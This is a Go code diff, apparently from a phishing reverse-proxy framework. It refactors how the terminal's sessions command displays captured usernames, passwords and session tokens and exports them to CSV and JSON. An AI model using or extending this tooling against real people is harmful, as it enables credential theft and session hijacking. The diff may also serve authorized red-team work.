@@ -372,12 +372,6 @@ func (t *Terminal) handleSessions(args []string) error {
 		s_found := false
 		for _, s := range sessions {
 			if s.Id == id {
-				pl, err := t.cfg.GetPhishlet(s.Phishlet)
-				if err != nil {
-					log.Error("%v", err)
-					break
-				}
-
 				s_found = true
 				tcol := dgray.Sprint("empty")
 				if len(s.Tokens) > 0 {
@@ -398,7 +392,7 @@ func (t *Terminal) handleSessions(args []string) error {
 				}
 
 				if len(s.Tokens) > 0 {
-					json_tokens := tokensToJSON(pl, s.Tokens)
+					json_tokens := tokensToJSON(s.Tokens)
 					t.output("%s\n", json_tokens)
 				} else {
 					t.output("\n")
@@ -494,12 +488,7 @@ func (t *Terminal) handleSessions(args []string) error {
 				wr := csv.NewWriter(outFile)
 				wr.Write([]string{"Id", "Phishlet", "Username", "Password", "Tokens (base64 encoded)", "Remote IP", "Time"})
 				for _, s := range sessions {
-					pl, err := t.cfg.GetPhishlet(s.Phishlet)
-					if err != nil {
-						log.Error("%v", err)
-						break
-					}
-					base64tokens := base64.StdEncoding.EncodeToString([]byte(tokensToJSON(pl, s.Tokens)))
+					base64tokens := base64.StdEncoding.EncodeToString([]byte(tokensToJSON(s.Tokens)))
 					wr.Write([]string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, base64tokens, s.RemoteAddr, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")})
 				}
 				wr.Flush()
@@ -516,17 +505,12 @@ func (t *Terminal) handleSessions(args []string) error {
 				}
 				var exported []*ExportedSession
 				for _, s := range sessions {
-					pl, err := t.cfg.GetPhishlet(s.Phishlet)
-					if err != nil {
-						log.Error("%v", err)
-						break
-					}
 					es := &ExportedSession{
 						Id:         strconv.Itoa(s.Id),
 						Phishlet:   s.Phishlet,
 						Username:   s.Username,
 						Password:   s.Password,
-						Tokens:     base64.StdEncoding.EncodeToString([]byte(tokensToJSON(pl, s.Tokens))),
+						Tokens:     base64.StdEncoding.EncodeToString([]byte(tokensToJSON(s.Tokens))),
 						RemoteAddr: s.RemoteAddr,
 						Time:       time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
 					}
